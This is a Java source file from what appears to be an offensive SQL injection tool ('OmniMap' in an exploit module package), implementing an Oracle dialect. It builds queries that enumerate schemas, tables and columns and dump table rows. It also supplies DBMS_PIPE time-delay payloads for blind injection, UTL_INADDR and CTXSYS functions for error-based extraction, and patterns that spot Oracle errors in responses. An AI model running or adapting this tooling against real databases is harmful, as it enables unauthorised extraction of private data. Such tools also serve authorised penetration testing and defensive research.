package com.omnistrike.modules.exploit.omnimap.dbms;

import java.util.List;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

/**
 * Oracle Database dialect for OmniMap.
 * Uses ALL_TABLES/ALL_TAB_COLUMNS, SUBSTR(), CHR(), DBMS_PIPE.RECEIVE_MESSAGE for delays,
 * CASE WHEN for conditionals, and UTL_INADDR/CTXSYS for error-based extraction.
 */
public class OracleDialect implements DbmsDialect {

    @Override
    public String getName() { return "Oracle"; }

    @Override
    public String currentDatabase() {
        return "SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL";
    }

    @Override
    public String listDatabases() {
        // Oracle doesn't have multiple databases like MySQL; list tablespace owners instead
        return "SELECT DISTINCT owner FROM ALL_TABLES";
    }

    @Override
    public String listTables(String database) {
        return "SELECT table_name FROM ALL_TABLES WHERE owner='" + database.toUpperCase() + "'";
    }

    @Override
    public String listColumns(String database, String table) {
        return "SELECT column_name FROM ALL_TAB_COLUMNS WHERE owner='" + database.toUpperCase()
                + "' AND table_name='" + table.toUpperCase() + "'";
    }

    @Override
    public String dumpData(String database, String table, List<String> columns, int offset, int limit) {
        String cols = columns.stream()
                .map(c -> "NVL(CAST(\"" + c + "\" AS VARCHAR2(4000)),CHR(32))")
                .collect(Collectors.joining("||CHR(124)||"));
        return "SELECT " + cols + " FROM (SELECT a.*,ROWNUM rnum FROM "
                + "\"" + database.toUpperCase() + "\".\"" + table.toUpperCase() + "\" a WHERE ROWNUM<="
                + (offset + limit) + ") WHERE rnum>" + offset;
    }

    @Override
    public String charFunction(int ascii) {
        return "CHR(" + ascii + ")";
    }

    @Override
    public String substringFunction(String expr, int pos, int len) {
        return "SUBSTR((" + expr + ")," + pos + "," + len + ")";
    }

    @Override
    public String lengthFunction(String expr) {
        return "LENGTH((" + expr + "))";
    }

    @Override
    public String sleepFunction(int seconds) {
        return "DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67)," + seconds + ")";
    }

    @Override
    public String ifFunction(String condition, String trueVal, String falseVal) {
        return "CASE WHEN (" + condition + ") THEN " + trueVal + " ELSE " + falseVal + " END";
    }

    @Override
    public String commentSuffix() {
        return "--";
    }

    @Override
    public String concatenate(String... parts) {
        return String.join("||", parts);
    }

    @Override
    public List<String> errorFunctions() {
        return List.of(
                "UTL_INADDR.GET_HOST_NAME((%s))",
                "CTXSYS.DRITHSX.SN(1,(%s))",
                "TO_NUMBER((%s))"
        );
    }

    @Override
    public List<Pattern> errorPatterns() {
        return List.of(
                Pattern.compile("ORA-\\d{5}", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Oracle.*Driver", Pattern.CASE_INSENSITIVE),
                Pattern.compile("oracle\\.jdbc", Pattern.CASE_INSENSITIVE),
                Pattern.compile("quoted string not properly terminated", Pattern.CASE_INSENSITIVE),
                Pattern.compile("invalid number", Pattern.CASE_INSENSITIVE),
                Pattern.compile("SQL command not properly ended", Pattern.CASE_INSENSITIVE)
        );
    }

    @Override
    public String countRows(String database, String table) {
        return "SELECT COUNT(*) FROM \"" + database.toUpperCase() + "\".\"" + table.toUpperCase() + "\"";
    }

    @Override
    public String separator() {
        return "CHR(124)";
    }

    @Override
    public String limitOffset(String query, int limit, int offset) {
        return "SELECT * FROM (SELECT a.*,ROWNUM rnum FROM (" + query
                + ") a WHERE ROWNUM<=" + (offset + limit) + ") WHERE rnum>" + offset;
    }
}
